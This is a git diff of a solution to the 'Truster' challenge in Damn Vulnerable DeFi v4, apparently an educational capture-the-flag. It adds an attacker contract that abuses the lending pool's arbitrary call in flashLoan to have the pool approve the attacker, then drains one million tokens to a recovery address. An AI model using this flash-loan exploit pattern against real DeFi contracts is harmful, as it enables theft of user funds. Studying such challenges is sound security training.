@@ -2,9 +2,23 @@
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
-import {Test, console} from "forge-std/Test.sol";
+import {Test, console} from "../../lib/forge-std/src/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
+
+
+contract TrusterAttacker {
+    function attack(TrusterLenderPool pool,DamnValuableToken token, address recovery ) external {
+        console.log(address(this), ": this address"); 
+        console.log("msg.sender:", msg.sender);
+        console.log("tx.origin:", tx.origin);
+
+        bytes memory data = abi.encodeCall(token.approve, (address(this), 1_000_000e18));
+        pool.flashLoan(0, address(this), address(token), data);
+        token.transferFrom(address(pool), recovery, 1_000_000e18);
+    }
+}
+
 
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -51,7 +65,12 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        TrusterAttacker attacker = new TrusterAttacker();
+        attacker.attack(pool, token, recovery);
+
+        // bytes memory data = abi.encodeCall(token.approve, (player, 1_000_000e18));
+        // pool.flashLoan(0, player, address(token), data);
+        // token.transferFrom(address(pool), recovery, 1_000_000e18);
     }
 
     /**
